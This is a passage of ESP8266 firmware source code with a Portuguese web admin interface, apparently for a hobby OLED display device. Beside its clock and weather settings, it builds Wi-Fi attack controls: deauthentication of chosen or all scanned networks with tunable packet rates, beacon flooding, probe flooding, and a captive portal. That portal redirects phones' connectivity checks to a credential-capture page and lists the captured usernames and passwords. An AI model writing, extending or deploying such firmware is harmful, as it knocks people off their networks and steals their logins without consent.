ecsistem/oled-esp8266/src/wifi_portal.cpp
    page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}";
    page += "input,select,button{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:0}";
    page += "input,select{background:#222;color:#fff} button{background:#00a6ff;color:#fff;font-weight:bold}";
    page += ".card{background:#1b1b1b;padding:18px;border-radius:16px;margin-bottom:12px}";
    page += ".muted{color:#aaa;font-size:14px} .secondary{background:#2a2a2a} .danger{background:#8b2d2d}";
    page += ".ok{color:#58d68d}.bad{color:#ff7675} table {width:100%; border-collapse:collapse;} th,td {padding:8px; text-align:left; border-bottom:1px solid #333;}</style></head><body>";

    // Configuração Wi-Fi (mantida original)
    page += "<div class='card'><h2>Configurar Wi-Fi</h2>";
    page += "<p class='muted'>Conectado ao hotspot: " + apSsid + "</p>";
    page += "<p class='muted'>Seguranca AP: " + String(apOpen ? "Aberto (sem senha)" : "WPA2") + "</p>";
    page += "<p class='muted'>Status STA: " + (staConnected ? "<span class='ok'>Conectado</span>" : "<span class='bad'>" + wifiStatusToText(staStatus) + "</span>") + "</p>";
    page += "<p class='muted'>IP AP: " + WiFi.softAPIP().toString() + "</p>";
    page += "<p class='muted'>IP STA: " + (staConnected ? WiFi.localIP().toString() : "-") + "</p>";
    page += "<form method='post' action='/save'>";
    page += "<select name='ssid' required>" + wifiOptions + "</select>";
    page += "<input name='password' placeholder='Senha do Wi-Fi' type='password' value='" + escapeHtml(wifiPassword) + "'>";
    page += "<h3>Hotspot do dispositivo</h3>";
    page += "<label>Nome do hotspot (AP)</label>";
    page += "<input name='ap_ssid' maxlength='31' value='" + escapeHtml(apSsid) + "'>";
    page += "<label><input name='ap_open' type='checkbox'" + String(apOpen ? " checked" : "") + "> Hotspot aberto (sem senha)</label>";
    page += "<input name='ap_password' placeholder='Senha AP (minimo 8 caracteres)' type='password' value='" + escapeHtml(apPassword) + "'>";
    page += "<h3>Ajustes do Sistema</h3>";
    page += "<label>Intervalo do clima (segundos)</label>";
    page += "<input name='weather_sec' type='number' min='10' max='3600' value='" + String(weatherUpdateIntervalMs / 1000) + "'>";
    page += "<label>Fuso horario (UTC, ex: -3)</label>";
    page += "<input name='tz' type='number' min='-12' max='14' value='" + String(timezoneOffsetHours) + "'>";
    page += "<label>Brilho OLED (0-255)</label>";
    page += "<input name='brightness' type='number' min='0' max='255' value='" + String(oledBrightness) + "'>";
    page += "<label>Troca de tela (segundos)</label>";
    page += "<input name='screen_sec' type='number' min='2' max='120' value='" + String(screenChangeIntervalMs / 1000) + "'>";
    page += "<h3>Paginas ativas</h3>";
    page += "<label><input name='screen2_enabled' type='checkbox'" + String(screen2Enabled ? " checked" : "") + "> Temperatura</label>";
    page += "<label><input name='screen1_enabled' type='checkbox'" + String(screen1Enabled ? " checked" : "") + "> Wi-Fi / Status</label>";
    page += "<label><input name='screen3_enabled' type='checkbox'" + String(screen3Enabled ? " checked" : "") + "> Hora</label>";
    page += "<label><input name='screen4_enabled' type='checkbox'" + String(screen4Enabled ? " checked" : "") + "> Instagram</label>";
    page += "<label><input name='screen5_enabled' type='checkbox'" + String(screen5Enabled ? " checked" : "") + "> Deauther Wi-Fi</label>";
    page += "<p class='muted'>A tela do olho sempre fica ativa.</p>";
    page += "<label><input name='captive_portal' type='checkbox'" + String(captivePortalEnabled ? " checked" : "") + "> Ativar captive portal</label>";
    page += "<h3>Deauther v2 (persistido)</h3>";
    page += "<p class='muted'>Alinhado ao esp8266_deauther: deauth-all usa o ultimo scan (ecra 5 ou Buscar no /admin).</p>";
    page += "<label><input name='deauther_deauth_all' type='checkbox'" + String(deautherDeauthAll ? " checked" : "") + "> Modo deauth em todos os AP do scan (deauthAll)</label>";
    page += "<label>Deauths por alvo / segundo (DEAUTHS_PER_TARGET, 1–250)</label>";
    page += "<input name='deauther_deauths_per_target' type='number' min='1' max='250' value='" + String(deautherDeauthsPerTarget) + "'>";
    page += "<label>Codigo de motivo 802.11 (1–45)</label>";
    page += "<input name='deauther_deauth_reason' type='number' min='1' max='45' value='" + String(deautherDeauthReason) + "'>";
    page += "<label><input name='deauther_beacon_100ms' type='checkbox'" + String(deautherBeaconInterval100ms ? " checked" : "") + "> Beacon interval 100 ms (desmarcado = 1 s)</label>";
    page += "<label>Probe: frames por SSID / segundo (1–20)</label>";
    page += "<input name='deauther_probe_frames' type='number' min='1' max='20' value='" + String(deautherProbeFramesPerSsid) + "'>";
    page += "<input type='hidden' name='deauther_ap_mac' value='" + escapeHtml(deautherApMac) + "'>";
    page += "<input type='hidden' name='deauther_client_mac' value='" + escapeHtml(deautherClientMac) + "'>";
    page += "<input type='hidden' name='deauther_channel' value='" + String(deautherChannel) + "'>";
    page += "<button type='submit'>Salvar e conectar</button></form>";
    page += "</div>";

    // Configuração do Deauther
    page += "<div class='card'>";
    page += "<h3>Deauther Wi-Fi</h3>";
    page += "<p class='muted'>Busque redes e selecione um alvo, ou use Deauth em todos (ultimo scan). O firmware mantem <strong>SoftAP + STA</strong> durante a injecao (como no v2 com UI).</p>";
    page += "<p><strong>Status:</strong> " + String(deautherRunning ? "<span class='ok'>ATIVO</span>" : "<span class='bad'>PARADO</span>") + "</p>";
    if (deautherRunning)
    {
      page += "<p><strong>Deauth/s (ultimo segundo, deauthPkts):</strong> " + String(deautherPacketsSent) + "</p>";
      page += "<p><strong>Pacotes/s (ultimo segundo, packetRate):</strong> " + String(deautherTmpPacketRate) + "</p>";
      page += "<p><strong>Recusadas pelo driver:</strong> " + String(deautherInjectFail) + " <span class='muted'>(fila cheia = aumente pausa no codigo)</span></p>";
    }
    page += "<button onclick='loadNetworks()'>Buscar Redes Wi-Fi</button>";
    page += "<div id='networksList' style='margin-top:12px;'></div>";
    page += "<div id='deautherControls' style='margin-top:12px;display:none;'>";
    page += "<p><strong>Alvo selecionado:</strong> <span id='selectedTarget'>-</span></p>";
    page += "<button onclick='startDeauth()'>Iniciar Deauth (alvo)</button>";
    page += "<button onclick='startDeauthAll()' class='secondary' style='margin-left:8px;'>Deauth todos (scan)</button>";
    page += "<button onclick='stopDeauth()' style='background:#8b2d2d;margin-left:8px;'>Parar</button>";
    page += "</div>";
    page += "<p class='muted' style='margin-top:8px;'>Deauth todos: exige scan antes (botao acima ou ecra 5). Ajustes v2 estao no formulario <strong>Salvar e conectar</strong>.</p>";
    page += "</div>";

    // Beacon Flood
    page += "<div class='card'>";
    page += "<h3>Beacon Flood</h3>";
    page += "<p class='muted'>Inunda a area com beacons de redes falsas para poluir a lista de Wi-Fi.</p>";
    page += "<p><strong>Status:</strong> " + String(beaconActive ? "<span class='ok'>ATIVO</span>" : "<span class='bad'>PARADO</span>") + "</p>";
    if (beaconActive)
    {
      page += "<p><strong>Pacotes enviados:</strong> " + String(beaconPacketsSent) + "</p>";
    }
    page += "<button onclick='startBeacon()'>Iniciar Beacon Flood</button>";
    page += "<button onclick='stopBeacon()' style='background:#8b2d2d;margin-left:8px;'>Parar Beacon Flood</button>";
    page += "</div>";

    page += "<div class='card'>";
    page += "<h3>Probe flood (v2)</h3>";
    page += "<p class='muted'>Probe requests com SSIDs do roster interno (paridade com Attack::sendProbe).</p>";
    page += "<p><strong>Status:</strong> " + String(probeActive ? "<span class='ok'>ATIVO</span>" : "<span class='bad'>PARADO</span>") + "</p>";
    if (probeActive)
    {
      page += "<p><strong>Pacotes (sessao):</strong> " + String(probePacketsSent) + "</p>";
    }
    page += "<button onclick='startProbe()'>Iniciar Probe</button>";
    page += "<button onclick='stopProbe()' style='background:#8b2d2d;margin-left:8px;'>Parar Probe</button>";
    page += "</div>";

    page += "<div class='card'><h3>Usuarios e senhas capturados</h3>";
    page += "<form method='post' action='/credentials/clear' onsubmit=\"return confirm('Apagar TODOS os logins salvos?')\">";
    page += "<button class='danger' type='submit'>Apagar todos os logins</button></form>";
    page += credentialsTable;
    page += "</div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleStatusPage()
  {
    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#0e0f12;color:#f4f4f4;max-width:620px;margin:0 auto;padding:20px} .card{background:#1a1d23;padding:16px;border-radius:14px;margin:10px 0} .label{color:#9aa4b2;font-size:13px} .value{font-size:18px} .ok{color:#53d769} .bad{color:#ff6b6b} a{color:#7cc7ff} button{width:100%;padding:12px;margin-top:10px;border:0;border-radius:10px;background:#2a2f3a;color:#fff}</style>";
    page += "<script>async function r(){try{const s=await fetch('/api/status');const j=await s.json();document.getElementById('sta').innerText=j.sta_status;document.getElementById('staIp').innerText=j.sta_ip;document.getElementById('ap').innerText=j.ap_ssid;document.getElementById('apIp').innerText=j.ap_ip;document.getElementById('clients').innerText=j.ap_clients;document.getElementById('ssid').innerText=j.saved_ssid;document.getElementById('rssi').innerText=j.rssi;document.getElementById('last').innerText=j.last_connect_attempt_age_ms+' ms';document.getElementById('uptime').innerText=j.uptime_ms+' ms';document.getElementById('temp').innerText=j.temperature_c+' C';document.getElementById('screen').innerText=j.active_screen;}catch(e){}}setInterval(r,2000);window.onload=r;</script></head><body>";
    page += "<h2>Status do Servidor Wi-Fi</h2>";
    page += "<div class='card'><div class='label'>STA Status</div><div class='value' id='sta'>-</div><div class='label'>STA IP</div><div class='value' id='staIp'>-</div><div class='label'>RSSI</div><div class='value' id='rssi'>-</div></div>";
    page += "<div class='card'><div class='label'>AP SSID</div><div class='value' id='ap'>-</div><div class='label'>AP IP</div><div class='value' id='apIp'>-</div><div class='label'>Clientes no AP</div><div class='value' id='clients'>-</div></div>";
    page += "<div class='card'><div class='label'>SSID salvo</div><div class='value' id='ssid'>-</div><div class='label'>Ultima tentativa de conexao</div><div class='value' id='last'>-</div><div class='label'>Uptime</div><div class='value' id='uptime'>-</div><div class='label'>Temperatura</div><div class='value' id='temp'>-</div><div class='label'>Tela ativa</div><div class='value' id='screen'>-</div></div>";
    page += "<button onclick=\"location.href='/admin'\">Voltar para configuracao</button>";
    page += "<div class='card'><a href='/api/status'>Abrir JSON de status</a></div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);
  }

  void handleStatusJson()
  {
    JsonDocument doc;
    wl_status_t staStatus = WiFi.status();
    bool staConnected = staStatus == WL_CONNECTED;

    doc["sta_status"] = wifiStatusToText(staStatus);
    doc["sta_connected"] = staConnected;
    doc["sta_ip"] = staConnected ? WiFi.localIP().toString() : String("-");
    doc["rssi"] = staConnected ? String(WiFi.RSSI()) + " dBm" : String("-");
    doc["ap_ssid"] = apSsid;
    doc["ap_open"] = apOpen;
    doc["ap_ip"] = WiFi.softAPIP().toString();
    doc["ap_clients"] = WiFi.softAPgetStationNum();
    doc["saved_ssid"] = wifiSsid;
    doc["last_connect_attempt_ms"] = lastConnectAttemptAt;
    doc["last_connect_attempt_age_ms"] = lastConnectAttemptAt > 0 ? millis() - lastConnectAttemptAt : 0;
    doc["uptime_ms"] = millis();
    doc["temperature_c"] = temp;
    doc["active_screen"] = screen;
    doc["weather_update_interval_ms"] = weatherUpdateIntervalMs;
    doc["screen_change_interval_ms"] = screenChangeIntervalMs;
    doc["timezone_offset_hours"] = timezoneOffsetHours;
    doc["oled_brightness"] = oledBrightness;
    doc["captive_portal_enabled"] = captivePortalEnabled;
    doc["screen1_enabled"] = screen1Enabled;
    doc["screen2_enabled"] = screen2Enabled;
    doc["screen3_enabled"] = screen3Enabled;
    doc["screen4_enabled"] = screen4Enabled;
    doc["screen5_enabled"] = screen5Enabled;
    doc["deauther_ap_mac"] = deautherApMac;
    doc["deauther_client_mac"] = deautherClientMac;
    doc["deauther_channel"] = deautherChannel;
    doc["deauther_deauth_all"] = deautherDeauthAll;
    doc["deauther_deauths_per_target"] = deautherDeauthsPerTarget;
    doc["deauther_deauth_reason"] = deautherDeauthReason;
    doc["deauther_beacon_interval_100ms"] = deautherBeaconInterval100ms;
    doc["deauther_probe_frames_per_ssid"] = deautherProbeFramesPerSsid;
    doc["deauther_running"] = deautherRunning;
    doc["deauther_packets_sent"] = deautherPacketsSent;
    doc["deauther_tmp_packet_rate"] = deautherTmpPacketRate;
    doc["deauther_inject_fail"] = deautherInjectFail;
    doc["beacon_active"] = beaconActive;
    doc["beacon_packets_sent"] = beaconPacketsSent;
    doc["probe_active"] = probeActive;
    doc["probe_packets_sent"] = probePacketsSent;
    doc["wifi_scan_ap_count"] = g_wifiScanNetworkCount;

    String payload;
    serializeJson(doc, payload);
    server.send(200, "application/json; charset=utf-8", payload);
  }

  void handleSave()
  {
    String newSsid = server.arg("ssid");
    String newPassword = server.arg("password");
    String newApSsid = server.arg("ap_ssid");
    String newApPassword = server.arg("ap_password");
    bool newApOpen = server.hasArg("ap_open");
    bool newCaptivePortalEnabled = server.hasArg("captive_portal");
    bool newScreen1Enabled = server.hasArg("screen1_enabled");
    bool newScreen2Enabled = server.hasArg("screen2_enabled");
    bool newScreen3Enabled = server.hasArg("screen3_enabled");
    bool newScreen4Enabled = server.hasArg("screen4_enabled");
    bool newScreen5Enabled = server.hasArg("screen5_enabled");
    String newDeautherApMac = server.arg("deauther_ap_mac");
    String newDeautherClientMac = server.arg("deauther_client_mac");
    int newDeautherChannel = parseIntBounded(server.arg("deauther_channel"), 1, 14, deautherChannel);
    bool newDeautherDeauthAll = server.hasArg("deauther_deauth_all");
    int newDeautherDeauthsPerTarget =
        parseIntBounded(server.arg("deauther_deauths_per_target"), 1, 250, deautherDeauthsPerTarget);
    int newDeautherDeauthReason =
        parseIntBounded(server.arg("deauther_deauth_reason"), 1, 45, deautherDeauthReason);
    bool newDeautherBeacon100ms = server.hasArg("deauther_beacon_100ms");
    int newDeautherProbeFrames =
        parseIntBounded(server.arg("deauther_probe_frames"), 1, 20, deautherProbeFramesPerSsid);
    unsigned long weatherSec = parseULongBounded(server.arg("weather_sec"), 10, 3600, weatherUpdateIntervalMs / 1000);
    unsigned long screenSec = parseULongBounded(server.arg("screen_sec"), 2, 120, screenChangeIntervalMs / 1000);
    int newTz = parseIntBounded(server.arg("tz"), -12, 14, timezoneOffsetHours);
    int newBrightness = parseIntBounded(server.arg("brightness"), 0, 255, oledBrightness);

    if (!newScreen1Enabled && !newScreen2Enabled && !newScreen3Enabled && !newScreen4Enabled && !newScreen5Enabled)
    {
      server.send(400, "text/plain; charset=utf-8", "Ative pelo menos uma pagina adicional");
      return;
    }

    if (newSsid.length() == 0)
    {
      server.send(400, "text/plain; charset=utf-8", "SSID vazio");
      return;
    }

    if (newApSsid.length() == 0)
    {
      newApSsid = "OLED-" + String(ESP.getChipId(), HEX);
    }

    if (!newApOpen && newApPassword.length() < 8)
    {
      server.send(400, "text/plain; charset=utf-8", "Senha do hotspot deve ter no minimo 8 caracteres ou marque hotspot aberto");
      return;
    }

    wifiSsid = newSsid;
    wifiPassword = newPassword;
    apSsid = newApSsid;
    apPassword = newApPassword;
    apOpen = newApOpen;
    weatherUpdateIntervalMs = weatherSec * 1000;
    screenChangeIntervalMs = screenSec * 1000;
    timezoneOffsetHours = newTz;
    oledBrightness = static_cast<uint8_t>(newBrightness);
    screen1Enabled = newScreen1Enabled;
    screen2Enabled = newScreen2Enabled;
    screen3Enabled = newScreen3Enabled;
    screen4Enabled = newScreen4Enabled;
    screen5Enabled = newScreen5Enabled;
    deautherApMac = newDeautherApMac;
    deautherClientMac = newDeautherClientMac;
    deautherChannel = newDeautherChannel;
    deautherDeauthAll = newDeautherDeauthAll;
    deautherDeauthsPerTarget = newDeautherDeauthsPerTarget;
    deautherDeauthReason = newDeautherDeauthReason;
    deautherBeaconInterval100ms = newDeautherBeacon100ms;
    deautherProbeFramesPerSsid = newDeautherProbeFrames;
    setCaptivePortalEnabled(newCaptivePortalEnabled);

    applyDisplayAndTimeSettings();
    bool saved = saveWiFiConfig();
    applyCaptivePortalDnsState();

    String page;
    page += "<!doctype html><html><head><meta charset='utf-8'>";
    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
    page += "<meta http-equiv='refresh' content='4;url=/status'>";
    page += "<style>body{font-family:Arial,sans-serif;background:#101216;color:#f4f4f4;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px}.card{background:#1b1f27;padding:22px;border-radius:16px;max-width:460px;width:100%}.ok{color:#53d769}.bad{color:#ff6b6b}.loader{width:18px;height:18px;border-radius:50%;border:3px solid #4f5d75;border-top-color:#fff;display:inline-block;animation:s 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes s{to{transform:rotate(360deg)}}</style></head><body>";
    page += "<div class='card'><h3>Salvando configuracao</h3>";
    page += "<p>SSID selecionado: <strong>" + escapeHtml(wifiSsid) + "</strong></p>";
    page += saved ? "<p class='ok'>Dados salvos com sucesso.</p>" : "<p class='bad'>Falha ao salvar no armazenamento.</p>";
    page += "<p><span class='loader'></span>Tentando conectar agora...</p>";
    page += "<p>Voce sera redirecionado para a pagina de status em alguns segundos.</p>";
    page += "<p><a href='/status' style='color:#7cc7ff'>Abrir status agora</a></p></div></body></html>";

    server.send(200, "text/html; charset=utf-8", page);

    startHotspot();
    WiFi.disconnect();
    connectStationWiFi();
  }

  void startConfigPortal()
  {
    server.on("/", HTTP_GET, handleCredentialCapturePage);
    server.on("/login", HTTP_POST, handleCredentialSubmit);
    server.on("/admin", HTTP_GET, handleAdminPortal);
    server.on("/generate_204", HTTP_GET, handleCaptiveRedirect);
    server.on("/gen_204", HTTP_GET, handleCaptiveRedirect);
    server.on("/hotspot-detect.html", HTTP_GET, handleCaptiveRedirect);
    server.on("/ncsi.txt", HTTP_GET, handleCaptiveRedirect);
    server.on("/connecttest.txt", HTTP_GET, handleCaptiveRedirect);
    server.on("/fwlink", HTTP_GET, handleCaptiveRedirect);
    server.on("/status", HTTP_GET, handleStatusPage);
    server.on("/api/status", HTTP_GET, handleStatusJson);
    server.on("/api/router-lab", HTTP_POST, handleRouterLabSend);
    server.on("/api/scan", HTTP_GET, handleApiScanJson);
    server.on("/api/deauth/start", HTTP_POST, handleApiDeauthStart);
    server.on("/api/deauth/stop", HTTP_POST, handleApiDeauthStop);
    server.on("/api/beacon/start", HTTP_POST, handleApiBeaconStart);
    server.on("/api/beacon/stop", HTTP_POST, handleApiBeaconStop);
    server.on("/api/probe/start", HTTP_POST, handleApiProbeStart);
    server.on("/api/probe/stop", HTTP_POST, handleApiProbeStop);
    server.on("/save", HTTP_POST, handleSave);
    server.on("/credentials/delete", HTTP_POST, handleDeleteCapturedCredential);
    server.on("/credentials/clear", HTTP_POST, handleClearCapturedCredentials);
    server.onNotFound([]()
                      {
      if (captivePortalEnabled)
      {
        handleCaptiveRedirect();
        return;
      }

      server.send(404, "text/plain; charset=utf-8", "Rota nao encontrada. Abra /admin"); });
    server.begin();
  }

  void portalRestoreWiFiAfterDeauth_body()
  {
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP_STA);
    delay(200);
    startHotspot();
    delay(120);
    if (WiFi.softAPIP() == IPAddress(0, 0, 0, 0))
    {
      delay(200);
      startHotspot();
    }
    if (wifiSsid.length() > 0)
    {
      connectStationWiFi();
    }
  }
} // namespace

void restorePortalWiFiAfterDeauth()
{
  restoreWifiRegAfterInjection();
  portalRestoreWiFiAfterDeauth_body();
}

void initWiFiAndPortal()
{
  LittleFS.begin();
  loadWiFiConfig();

  WiFi.persistent(false);
  WiFi.mode(WIFI_AP_STA);
  delay(100);

  startHotspot();
  startConfigPortal();
  applyDisplayAndTimeSettings();

  display.clearDisplay();
  display.setTextSize(1);
  display.setCursor(0, 10);
  display.println("Conectando WiFi...");
  display.display();

  connectStationWiFi();
}

void handlePortalClient()
{
  server.handleClient();

  if (captivePortalEnabled)
  {
    dnsServer.processNextRequest();
  }
}

void setCaptivePortalEnabled(bool enabled)
{
  if (captivePortalEnabled == enabled)
  {
    return;
  }

  captivePortalEnabled = enabled;
  screen = 0;
  lastScreenChange = millis();
  portalToastMessage = enabled ? "Portal ativado" : "Portal desativado";
  portalToastUntil = millis() + 2500;
  applyCaptivePortalDnsState();
  saveWiFiConfig();
}

void toggleCaptivePortalEnabled()
{
  setCaptivePortalEnabled(!captivePortalEnabled);
}
